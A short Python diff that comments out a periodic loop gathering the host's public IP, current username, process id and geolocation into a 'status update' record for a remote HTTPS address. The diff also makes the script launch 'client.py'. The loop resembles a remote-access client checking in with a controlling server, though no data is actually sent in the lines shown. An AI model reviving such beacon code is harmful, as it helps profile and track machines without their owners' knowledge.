@@ -84,20 +84,21 @@ while True:
 time.sleep(1)
 print('ok')
 
-while True:
-    try:
-        time.sleep(60)
-        client_ip = get("http://api.ipify.org").text
-        data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
-                'pid': str(os.getpid()), 'ip': client_ip,
-                "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
-        headers = {'Connection': 'close'}
+#
+# while True:
+#     try:
+#         time.sleep(60)
+#         client_ip = get("http://api.ipify.org").text
+#         data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
+#                 'pid': str(os.getpid()), 'ip': client_ip,
+#                 "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
+#         headers = {'Connection': 'close'}
+#
+#         url = 'https://' + ip + '/'
+#         creds = ('user', 'pass')
+#
+#         print("send")
+#     except requests.exceptions.ConnectionError:
+#         pass
 
-        url = 'https://' + ip + '/'
-        creds = ('user', 'pass')
-
-        print("send")
-    except requests.exceptions.ConnectionError:
-        pass
-
-# os.Popen("python client.py")
+subprocess.Popen("python client.py")
